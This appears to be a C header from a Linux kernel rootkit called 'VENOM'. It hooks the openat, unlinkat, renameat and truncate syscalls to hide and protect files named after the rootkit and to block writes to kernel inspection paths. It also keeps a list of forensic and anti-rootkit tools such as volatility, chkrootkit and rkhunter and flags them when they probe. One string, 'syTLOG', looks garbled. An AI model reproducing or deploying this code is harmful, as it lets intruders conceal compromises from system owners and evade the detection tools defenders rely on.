#ifndef FILE_PROTECTION_H
#define FILE_PROTECTION_H

#include <linux/fs_struct.h>
#include <linux/path.h>
#include <linux/dcache.h>
#include <linux/mount.h>
#include "../include/headers.h"



static asmlinkage long (*orig_openat)(const struct pt_regs *regs);
static asmlinkage long (*orig_unlinkat)(const struct pt_regs *regs);
static asmlinkage long (*orig_renameat)(const struct pt_regs *regs);
static asmlinkage long (*orig_truncate)(const struct pt_regs *regs);


static const char *protected_patterns[] = {
    "venom",
    ".rootkit",
    ".hidden",
    NULL
};


static const char *sensitive_paths[] = {
    "/proc/kallsyms",
    "/proc/modules",
    "/sys/kernel/debug",
    "/sys/module",
    "/proc/sys/kernel",
    "/boot/System.map",
    "/dev/mem",
    "/dev/kmem",
    "/proc/kcore",
    "/sys/firmware",
    "/var/log/kern",
    "/var/log/audit",
    NULL
};


static const char *bypass_tools[] = {
    "volatility",
    "rekall",
    "chkrootkit",
    "rkhunter",
    "unhide",
    "tiger",
    "ossec",
    NULL
};


notrace static int is_protected_path(const char *path) {
    int i;
    
    if (!path)
        return 0;
    
    for (i = 0; protected_patterns[i] != NULL; i++) {
        if (strstr(path, protected_patterns[i]))
            return 1;
    }
    
    return 0;
}


notrace static int is_sensitive_path(const char *path) {
    int i;
    
    if (!path)
        return 0;
    
    for (i = 0; sensitive_paths[i] != NULL; i++) {
        if (strstr(path, sensitive_paths[i]))
            return 1;
    }
    
    return 0;
}


notrace static int is_suspicious_process(void) {
    int i;
    
    if (!current || !current->comm)
        return 0;
    
    for (i = 0; bypass_tools[i] != NULL; i++) {
        if (strstr(current->comm, bypass_tools[i]))
            return 1;
    }
    
    return 0;
}


notrace static void log_process_context(const char *action, const char *path) {
    char cwd[256] = {0};
    char *cwd_ptr;
    struct path pwd;
    
    struct fs_struct *fs = current->fs;
    spin_lock(&fs->lock);
    pwd = fs->pwd;
    path_get(&pwd);   // increment refcount to be safe
    spin_unlock(&fs->lock);

    cwd_ptr = d_path(&pwd, cwd, sizeof(cwd));
    if (IS_ERR(cwd_ptr))
        strncpy(cwd, "/unknown", sizeof(cwd));
    else
        strncpy(cwd, cwd_ptr, sizeof(cwd) - 1);
    
    TLOG_WARN("[VENOM] %s: %s | PID:%d (%s) UID:%d CWD:%s", action, path, current->pid, current->comm, current_uid().val, cwd);
}


notrace static asmlinkage long hooked_openat(const struct pt_regs *regs) {
    int dfd = (int)regs->di;
    const char __user *filename = (const char __user *)regs->si;
    int flags = (int)regs->dx;
    int mode = (int)regs->r10;
    char kfilename[PATH_MAX];
    long ret;
    
    if (strncpy_from_user(kfilename, filename, sizeof(kfilename) - 1) < 0)
        goto call_original;
    
    if (is_protected_path(kfilename)) {
        log_process_context("BLOCKED open of protected file", kfilename);
        return -ENOENT; 
    }
    
    if (is_sensitive_path(kfilename)) {
        log_process_context("MONITORED sensitive file access", kfilename);
        
        if (flags & (O_WRONLY | O_RDWR | O_APPEND | O_TRUNC)) {
            TLOG_WARN("[VENOM] BLOCKED write attempt to: %s", kfilename);
            return -EACCES;
        }
        
        if (is_suspicious_process()) {
            TLOG_CRIT("[VENOM] SUSPICIOUS TOOL accessing: %s", kfilename);
            
        }
    }
    
    if (strstr(kfilename, "/proc/") || strstr(kfilename, "/sys/")) {
        static int probe_count = 0;
        static unsigned long last_probe = 0;
        unsigned long now = jiffies;
        
        if (now - last_probe < HZ) { 
            probe_count++;
            if (probe_count > 10) {
                TLOG_CRIT("RAPID PROBING DETECTED from %s (PID:%d)", current->comm, current->pid);
                probe_count = 0;
            }
        } else {
            probe_count = 0;
        }
        last_probe = now;
    }

    if (strstr(kfilename, ".ko") || strstr(kfilename, "/sys/module")) {
        TLOG_INF("Module file access: %s", kfilename);
    }
    
    if (strstr(kfilename, "/etc/") && (flags & (O_WRONLY | O_RDWR))) {
        TLOG_INF("Config file write: %s", kfilename);
    }
    
call_original:
    ret = orig_openat(regs);
    
    if (ret >= 0 && is_sensitive_path(kfilename)) {
        TLOG_INF("Opened (fd=%ld): %s", ret, kfilename);
    }
    
    return ret;
}

notrace static asmlinkage long hooked_unlinkat(const struct pt_regs *regs) {
    int dfd = (int)regs->di;
    const char __user *pathname = (const char __user *)regs->si;
    int flags = (int)regs->dx;
    char kpath[PATH_MAX];
    
    if (strncpy_from_user(kpath, pathname, sizeof(kpath) - 1) < 0)
        goto call_original;
    

    if (is_protected_path(kpath)) {
        log_process_context("BLOCKED deletion attempt", kpath);
        return -EACCES;
    }
    
    if (strstr(kpath, "/etc/passwd") || 
        strstr(kpath, "/etc/shadow") ||
        strstr(kpath, "/boot/vmlinuz") ||
        strstr(kpath, "/sbin/init")) {
        TLOG_CRIT("CRITICAL FILE deletion blocked: %s", kpath);
        return -EPERM;
    }
    
    if (strstr(kpath, "/var/log/") || strstr(kpath, "/var/audit/")) {
        log_process_context("LOG FILE deletion detected", kpath);
    }
    
    if (strstr(kpath, "bash_history") || 
        strstr(kpath, ".history") ||
        strstr(kpath, ".bash_logout")) {
        TLOG_WARN("HISTORY file deletion: %s", kpath);
    }
    
    static int delete_count = 0;
    static unsigned long last_delete = 0;
    unsigned long now = jiffies;
    
    if (now - last_delete < HZ) {
        delete_count++;
        if (delete_count > 20) {
            TLOG_CRIT("MASS DELETION DETECTED: %d files from %s (PID:%d)", delete_count, current->comm, current->pid);
            delete_count = 0;
        }
    } else {
        delete_count = 0;
    }
    last_delete = now;
    
call_original:
    return orig_unlinkat(regs);
}


notrace static asmlinkage long hooked_renameat(const struct pt_regs *regs) {
    int olddfd = (int)regs->di;
    const char __user *oldname = (const char __user *)regs->si;
    int newdfd = (int)regs->dx;
    const char __user *newname = (const char __user *)regs->r10;
    char old_kpath[PATH_MAX];
    char new_kpath[PATH_MAX];
    
    if (strncpy_from_user(old_kpath, oldname, sizeof(old_kpath) - 1) < 0 ||
        strncpy_from_user(new_kpath, newname, sizeof(new_kpath) - 1) < 0)
        goto call_original;
    

    if (is_protected_path(old_kpath) || is_protected_path(new_kpath)) {
        TLOG_WARN("BLOCKED rename: %s -> %s", old_kpath, new_kpath);
        return -EACCES;
    }

    if (strstr(new_kpath, "..") || 
        strstr(new_kpath, ".bak") ||
        strstr(new_kpath, ".tmp")) { 
        TLOG_INF("Suspicious rename: %s -> %s", old_kpath, new_kpath);
    }
    
    if (strstr(old_kpath, "/etc/") || strstr(old_kpath, "/boot/") ||
        strstr(new_kpath, "/etc/") || strstr(new_kpath, "/boot/")) {
        log_process_context("CRITICAL rename detected", old_kpath);
        TLOG_WARN("Rename: %s -> %s", old_kpath, new_kpath);
    }
    
call_original:
    return orig_renameat(regs);
}

notrace static asmlinkage long hooked_truncate(const struct pt_regs *regs) {
    const char __user *path = (const char __user *)regs->di;
    loff_t length = (loff_t)regs->si;
    char kpath[PATH_MAX];
    
    if (strncpy_from_user(kpath, path, sizeof(kpath) - 1) < 0)
        goto call_original;
    
    if (is_protected_path(kpath)) {
        TLOG_WARN("BLOCKED truncate of: %s", kpath);
        return -EACCES;
    }
    
    if (length == 0 && (strstr(kpath, "/var/log/") || 
                        strstr(kpath, ".log") ||
                        strstr(kpath, "auth.log") ||
                        strstr(kpath, "syTLOG"))) {

        log_process_context("LOG CLEARING detected", kpath);
        TLOG_CRIT("Attempted to clear log: %s", kpath);
    }
    
call_original:
    return orig_truncate(regs);
}

#endif 
